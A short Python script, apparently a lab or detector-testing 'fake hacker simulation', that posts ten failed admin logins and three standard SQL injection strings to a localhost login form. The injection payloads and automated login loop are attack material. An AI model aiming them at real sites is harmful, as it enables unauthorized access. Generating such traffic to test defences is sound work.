import requests
import time

URL = "http://127.0.0.1:5000/"

def brute_force_attack():
    print("[+] Starting Brute Force Attack...")

    for i in range(10):
        data = {
            "username": "admin",
            "password": "wrongpass"
        }

        requests.post(URL, data=data)
        print(f"[+] Attempt {i+1}")
        time.sleep(0.5)


def sqli_attack():
    print("[+] Starting SQL Injection Attack...")

    payloads = [
        "' OR 1=1 --",
        "admin' OR '1'='1",
        "' UNION SELECT * --"
    ]

    for payload in payloads:
        data = {
            "username": payload,
            "password": "test"
        }

        requests.post(URL, data=data)
        print(f"[+] Injected: {payload}")
        time.sleep(1)


if __name__ == "__main__":
    print("[+] Fake Hacker Simulation Started\n")

    brute_force_attack()
    time.sleep(2)
    sqli_attack()

    print("\n[+] Attack Simulation Completed")